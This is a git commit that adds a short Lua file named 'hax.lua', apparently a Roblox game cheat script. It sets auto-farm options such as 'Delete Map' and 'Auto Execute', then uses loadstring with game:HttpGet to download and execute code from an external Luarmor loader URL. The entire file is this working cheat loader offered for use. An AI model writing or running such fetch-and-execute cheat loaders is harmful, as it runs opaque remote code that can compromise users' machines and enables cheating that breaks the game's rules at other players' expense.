64b3ba07edf1ca1f61167d24c3235da5982b68cb
Lozus2008 <138270973+Lozus2008@users.noreply.github.com>
2026-04-27 03:39:24 +0700

    Create hax.lua

---
+++ hax.lua
@@ -0,0 +1,7 @@
+_G.TekkitConfig = {
+    AutoFarm = true,
+    AutoReload = true,
+    FarmOptions = {"Delete Map", "Auto Execute", "Open 2nd Chest"}
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/705e7fe7aa288f0fe86900cedb1119b1.lua"))()
